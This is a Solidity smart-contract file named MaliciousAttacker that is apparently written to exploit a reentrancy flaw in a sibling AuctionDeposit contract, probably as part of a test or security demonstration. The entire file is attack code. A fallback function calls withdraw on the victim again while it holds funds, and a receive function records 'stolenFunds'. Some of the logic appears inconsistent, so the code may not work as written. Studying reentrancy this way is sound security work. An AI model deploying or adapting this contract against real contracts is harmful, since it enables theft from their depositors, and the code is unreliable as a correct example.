// MaliciousAttacker.sol
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import "../AuctionDeposit.sol";

contract MaliciousAttacker {
    AuctionDeposit public victimContract;
    uint256 public stolenFunds;

    constructor(address _victimContract) {
        victimContract = AuctionDeposit(_victimContract);
    }

    // Fallback function which is called whenever MaliciousAttacker receives ether
    fallback() external payable {
        if (address(victimContract).balance >= 1 ether) {
            victimContract.withdraw(1 ether);
        }
    }

    function attack(uint256 amount) public {
        require(address(this).balance >= amount, "Insufficient balance for attack");
        victimContract.deposit(amount);
        victimContract.withdraw(amount);
    }

    receive() external payable {
        stolenFunds += msg.value;
    }
}
